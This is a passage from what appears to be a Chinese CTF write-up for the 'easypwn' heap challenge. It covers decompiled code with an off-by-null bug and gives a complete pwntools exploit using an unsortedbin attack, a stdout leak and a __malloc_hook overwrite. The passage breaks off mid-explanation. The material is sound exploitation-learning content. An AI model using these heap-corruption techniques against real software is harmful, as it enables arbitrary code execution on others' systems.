class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read_n</span><span class="token punctuation">(</span>qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>看到read_n函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">read_n</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Fh] [rbp-11h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>  <span class="token keyword">unsigned</span> __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v6 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> buf <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v5 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      buf <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span>    <span class="token operator">++</span>i<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><del>根据经验，当读入数据的函数比较复杂的时候大概率会有off-by-one或者off-by-null</del></p><p>问题出在这两句</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre><p>if判断实际上就是<code>if(i&gt;=a2)</code>，a2是chunk的size，<code>*(_BYTE *)(a1 + ++i) = 0</code>，而这一句，++i有问题，当i为a2-1时，++i之后i就变成了a2，于是就会将下一个chunk的size位的一个字节设置为<code>\x00</code></p><p>再看到dele</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">dele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-14h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0x13</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  qword_202500<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  qword_202060<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没问题，free之后清空悬垂指针</p><p>整理信息，无fastbin，存在off-by-null，我们的利用思路如下</p><p>1.利用unsortedbin attack修改global_max_fast，使fastbin可用</p><p>2.修改<code>_IO_2_1_stdout_</code>泄露libc地址</p><p>3.fastbin attack</p><p>off-by-null的利用相对于off-by-one还是难啊。。。考验堆风水的构造，这题学到了新姿势，先贴exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'easypwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-easypwn.so'</span><span class="token punctuation">)</span>onegadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf0364</span><span class="token punctuation">,</span> <span class="token number">0xf1207</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit_n</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit_0</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'idx:'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>    dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    edit_0<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 6</span>    add<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 7</span>    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    global_max_fast <span class="token operator">=</span> <span class="token number">0x67f8</span>    payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span>    edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    stdout <span class="token operator">=</span> <span class="token number">0x55dd</span>    payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span>    edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>    edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>    edit_n<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c5600</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>    libc_realoc <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>    one_gadget <span class="token operator">=</span> libc_base<span class="token operator">+</span>onegadget<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_realoc => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_realoc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>    edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>    edit_n<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(io)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> io    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./easypwn'</span><span class="token punctuation">)</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>逐步讲解</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0xa8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>这一段的作用是在堆中留下main_arena的地址，方便后续利用</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/1.jpg" alt=""></p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span></code></pre><p>申请chunk，并于上次申请的chunk的位置错开，如下</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/2.jpg" alt=""></p><p>可以看到main_arena的地址已经落到了第二个chunk中</p><pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit_0<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x150</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><p>这段用来off-by-null，构造chunkoverlap，dele掉第一个0x71的chunk，再将0x101这个chunk的<strong>prev_size</strong>设置为前三个chunk的size之和，再将其dele掉，如此chunk3便会通过<strong>prev_size</strong>找到chunk0，中间两个chunk也被划入了其中，如下</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/3.jpg" alt=""></p><p>实际上chunk1和chunk2依然是使用状态</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/4.jpg" alt=""></p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 6</span>add<span class="token punctuation">(</span><span class="token number">0xb8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 7</span></code></pre><p>这一段的作用是将unsortedbin重新分割，并且要与chunk1和chunk2错位，需要能够通过这次分配的chunk来控制chunk1和chunk2，如下：</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/5.jpg" alt=""></p><p>如上图所示我们成功构造了chunkoverlap，chunk1被包含在了chunk0之中，chunk2被包含在了chunk3之中</p><pre class=" language-python"><code class="language-python">dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>global_max_fast <span class="token operator">=</span> <span class="token number">0x67f8</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>global_max_fast<span class="token number">-0x10</span><span class="token punctuation">)</span>edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span></code></pre><p>这一段先将chunk3删除掉，露出main_arena，然后通过chunk1修改chunk3的bk指针为global_max_fast-0x10，如下</p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/6.jpg" alt=""></p><p><img src="/LawlietLW.github.io/2020/08/29/qiang-wang-bei-2020/7.jpg" alt=""></p><p>我们成功修改了bk指针，将其指向了global_max_fast-0x10，几率为1/16</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>stdout <span class="token operator">=</span> <span class="token number">0x55dd</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xb0</span><span class="token punctuation">)</span>edit_n<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span>edit_n<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> 